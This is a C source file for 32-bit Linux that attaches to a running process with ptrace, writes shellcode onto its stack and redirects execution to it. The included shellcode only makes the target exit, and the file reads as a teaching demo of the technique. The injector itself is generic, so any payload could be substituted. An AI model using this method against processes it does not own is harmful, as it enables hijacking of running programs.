#include <stdio.h>
#include <stdlib.h>
#include <sys/ptrace.h> /* ptrace() */

#include <sys/wait.h>   /* wait() */
#include <sys/types.h>
#include <sys/user.h>   /* struct user_regs_struct */

/* _exit(1) implementation in shellcode */

static char shellcode[] =
    "\x31\xc0" 		/* xor  %eax,%eax */
    "\x40" 			/* inc  %eax */
    "\xcd\x80" 		/* int  $0x80 */ ;


#include <stdarg.h>
#define OUT_MSG(x, ...) printf("* " x "\n",## __VA_ARGS__)
#define ERR_MSG(x) printf("\t[Error] " x "\n")

int main(int argc, char *argv[])
{
    int pid, offset;
    struct user_regs_struct regs;

    OUT_MSG("Injector starts.");
    if (argc < 2) {
        ERR_MSG("PID required in parameter.");
        return -1;
    }

    pid = atoi(argv[1]);
    OUT_MSG("Attaching process (PID=%d)...", pid);
    if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) < 0) {
        ERR_MSG("Fail to ptrace process");
        ptrace(PTRACE_DETACH, pid, NULL, NULL);
        return -1;
    }

    OUT_MSG("Process attached.");
    /* see if  a child has stopped (but not traced via ptrace(2)) */

    if (waitpid(pid, NULL, WUNTRACED) < 0) {
        ERR_MSG("WUNTRACED");
        exit(1);
    }

    OUT_MSG("Getting registers from process.");
    if (ptrace(PTRACE_GETREGS, pid, NULL, &regs) < 0) {
        ERR_MSG("Fail to get registers.");
        ptrace(PTRACE_DETACH, pid, NULL, NULL);
        exit(1);
    }

    OUT_MSG("Injecting shellcode into process...");
    for (offset = 0; offset < sizeof(shellcode); offset++) {
        if (ptrace(PTRACE_POKEDATA, pid,
                   regs.esp + offset,
                   *(int *) &shellcode[offset])) {
            ERR_MSG("Fail to inject.");
            ptrace(PTRACE_DETACH, pid, NULL, NULL);
            exit(1);
        }
    }

    regs.eip = regs.esp;
    regs.eip += 2;

    OUT_MSG("Adjust program counter (EIP) of process to 0x%x",
            (unsigned int) regs.eip);
    if (ptrace(PTRACE_SETREGS, pid, NULL, &regs) < 0) {
        ERR_MSG("Unable to set registers.");
        ptrace(PTRACE_DETACH, pid, NULL, NULL);
        exit(1);
    }

    OUT_MSG("Detach process (PID=%d).", pid);
    ptrace(PTRACE_DETACH, pid, NULL, NULL);
    OUT_MSG("Done");
    return 0;
}
